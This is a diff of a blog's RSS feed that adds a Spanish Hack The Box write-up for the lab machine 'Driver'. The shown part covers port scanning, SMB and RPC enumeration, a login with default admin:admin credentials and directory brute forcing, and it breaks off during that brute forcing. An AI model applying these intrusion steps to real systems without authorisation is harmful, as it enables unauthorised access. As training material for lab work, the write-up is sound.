@@ -12,7 +12,7 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>es</language>
     <copyright>©{year}, All Rights Reserved</copyright>
-    <lastBuildDate>Fri, 14 May 2021 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Fri, 25 Feb 2022 00:00:00 +0000</lastBuildDate>
     <sy:updatePeriod>daily</sy:updatePeriod>
     <sy:updateFrequency>daily</sy:updateFrequency>
     
@@ -21,6 +21,1052 @@
     
     
 
+      
+      <item>
+        <title>Hack The Box - Driver</title>
+        <link>https://sckull.github.io/posts/driver/</link>
+        <pubDate>Fri, 25 Feb 2022 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Fri, 25 Feb 2022 00:00:00 +0000</atom:modified>
+        <guid>https://sckull.github.io/posts/driver/</guid>
+        <description>En driver encontramos un sitio web que nos permite subir archivos a un recurso compartido de SMB, utilizamos un archivo sfc lo que nos permitió obtener el hash de un primer usuario y acceso por WinRM.</description>
+        <content:encoded>
+
+
+
+  
+
+
+
+  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
+    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/driver/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
+  &lt;/div&gt;
+
+&lt;p&gt;En driver encontramos un sitio web que nos permite subir archivos a un recurso compartido de SMB, utilizamos un archivo sfc lo que nos permitió obtener el hash de un primer usuario y acceso por WinRM. Finalmente escalamos privilegios explotando la vulnerabilidad del servicio spool con PrintNightmare.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Nombre&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/387&#34;&gt;Driver&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;20&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Facil&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;10.10.11.106&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/13531&#34;&gt;MrR3boot&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/13531&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;
+&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
+  &lt;span class=&#34;button__text&#34;&gt;
+    Matrix
+  &lt;/span&gt;
+&lt;/a&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
+   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
+   &amp;quot;data&amp;quot;:{
+      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
+      &amp;quot;datasets&amp;quot;:[
+         {
+            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[4.9, 5.9, 6.2, 3.8, 4.1],
+            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
+            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
+         },
+         { 
+            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
+            &amp;quot;data&amp;quot;:[0, 0, 0, 0, 0],
+            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
+            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
+         }
+      ]
+   },
+    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
+            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
+            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
+        }
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h1 id=&#34;recon&#34;&gt;Recon&lt;/h1&gt;
+&lt;h2 id=&#34;nmap&#34;&gt;Nmap&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;nmap&lt;/code&gt; muestra distintos puertos abiertos: HTTP (80), RPC (445), SMB (445), WinRM (5985).&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; driver.htb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.11.106&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.11s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+
+PORT     STATE SERVICE      VERSION
+80/tcp   open  http         Microsoft IIS httpd 10.0
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-auth:
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class=&#34;m&#34;&gt;401&lt;/span&gt; Unauthorized&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;0D
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  Basic &lt;span class=&#34;nv&#34;&gt;realm&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;MFP Firmware Update Center. Please enter password &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; admin
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-methods:
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  Potentially risky methods: TRACE
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-IIS/10.0
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Site doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;UTF-8&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+135/tcp  open  msrpc        Microsoft Windows RPC
+445/tcp  open  microsoft-ds Microsoft Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; - &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; microsoft-ds &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
+Service Info: Host: DRIVER&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: mean: 7h19m09s, deviation: 0s, median: 7h19m08s
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-security-mode:
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   authentication_level: user
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   challenge_response: supported
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  message_signing: disabled &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;dangerous, but default&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode:
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02:
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled but not required
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time:
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2021-10-05T07:24:55
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: 2021-10-05T06:27:26
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;smb&#34;&gt;SMB&lt;/h2&gt;
+&lt;p&gt;Utilizando algunas herramientas intentamos enumerar los recursos compartidos en samba pero no encontramos alguno.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/driver ❯ smbclient -L 10.10.11.106
+Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\k&lt;/span&gt;ali&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password:
+session setup failed: NT_STATUS_ACCESS_DENIED 
+ π ~/htb/driver ❯ crackmapexec smb 10.10.11.106 --shares
+SMB         10.10.11.106    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DRIVER           &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; Enterprise &lt;span class=&#34;m&#34;&gt;10240&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:DRIVER&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:DRIVER&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:True&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+SMB         10.10.11.106    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DRIVER           &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Error enumerating shares: Error occurs &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; reading from remote&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;104&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+ π ~/htb/driver ❯
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;rpc&#34;&gt;RPC&lt;/h2&gt;
+&lt;p&gt;De igual forma con una sesion nula por RCP no logramos ingresar.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/driver ❯ rpcclient -U &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; -N 10.10.11.106
+Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
+ π ~/htb/driver ❯
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;web-site&#34;&gt;Web Site&lt;/h2&gt;
+&lt;p&gt;En el puerto 80 vemos que pregunta por credenciales para el usuario admin.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/driver/Screenshot_20211004_174413.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Utilizamos el nombre de usuario como contraseña (admin:admin) con los cuales logramos ingresar. Observamos un mensaje sobre tests de firmwares y drivers, además se muestra un dominio en el footer de la pagina el cual agregamos al archivo &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/driver/Screenshot_20211004_174604.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Vemos en la pagina de &lt;code&gt;Firmware Updates&lt;/code&gt; un formulario para subir acrhivos de actualización de firmware, en el mensaje indica la selección de un modelo de impresora y, al subir los archivos estos se guardarían en algun recurso compartido de archivos (&amp;ldquo;refiriendose a SMB&amp;rdquo;), y que, algun equipo realizará una revision y testing.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/driver/Screenshot_20211004_175931.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;directory-brute-forcing&#34;&gt;Directory Brute Forcing&lt;/h2&gt;
+&lt;p&gt;Utilizamos &lt;code&gt;feroxbuster&lt;/code&gt; para busqueda de directorios y archivos, con la extensión &lt;code&gt;php&lt;/code&gt; junto con el header de autenticacion del sitio. Vemos que solo se muestran un par de direcciónes y ninguna relacionada a una carpeta de archivos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/driver ❯ feroxbuster -u http://driver.htb/ -w &lt;span class=&#34;nv&#34;&gt;$MD&lt;/span&gt; -x php -H &lt;span class=&#34;s2&#34;&gt;&amp;#34;Authorization: Basic YWRtaW46YWRtaW4=&amp;#34;&lt;/span&gt;
+
+ ___  ___  __   __     __      __         __   ___
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /  &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;    /  &lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__
